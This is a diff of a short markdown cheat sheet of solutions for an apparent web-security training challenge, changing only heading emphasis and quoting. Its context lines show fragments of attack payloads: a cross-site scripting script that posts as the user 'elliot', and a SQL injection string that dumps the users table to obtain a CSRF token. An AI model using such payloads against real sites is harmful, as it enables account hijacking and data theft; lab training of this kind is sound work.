@@ -2,7 +2,7 @@
 
 This is a short cheat sheet for the challenge solutions.
 
-## NORMAL Difficulty
+## *NORMAL* Difficulty
 
 ### Reflective XSS:
 
@@ -81,7 +81,7 @@ xhr.send("uname=elliot&userPost=pwned");
 </script>
 ```
 
-## HARD Difficulty
+## *HARD* Difficulty
 
 ### Reflective XSS:
 
@@ -137,7 +137,7 @@ xhr.send("uname=elliot&userPost=pwned");
 
 ### CSRF:
 
-- Get Elliot's CSRF token from the friends database
+- Get Elliot's CSRF token from the 'friends' database
 
 ```SQL
 '; SELECT * FROM users;--
